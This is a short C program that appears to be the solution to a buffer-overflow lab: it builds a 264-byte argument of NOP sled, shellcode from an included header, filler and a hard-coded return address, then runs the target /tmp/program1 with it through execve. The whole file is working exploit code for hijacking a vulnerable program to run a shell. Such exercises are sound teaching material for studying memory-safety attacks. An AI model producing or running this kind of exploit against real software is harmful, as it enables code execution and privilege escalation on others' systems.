#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define PROGRAM "/tmp/program1"

int main(void)
{
  char *args[3];
  char *environ[1];
  char ex[264];

  for (int i = 0; i <250 ; i++){
  	ex[i] = '\x90';
  }

  int shell_index=0;
  for(int i=214; i<259; i++){
  ex[i] = shellcode[shell_index];
  shell_index++;
  }
	
  ex[259] = 'A'; 

  char ra[4] = {'\x78','\xdc','\xff','\xff'};
  int ra_index=0;
  for (int i=260; i<264; i++){
  	ex[i]=ra[ra_index];
	ra_index++;
  }
  args[0] = PROGRAM;
  args[1] = ex;
  args[2] = NULL;
  environ[0] = NULL;

  if (0 > execve(PROGRAM, args, environ))
    fprintf(stderr, "call to execve failed.\n");

  return 0;
}
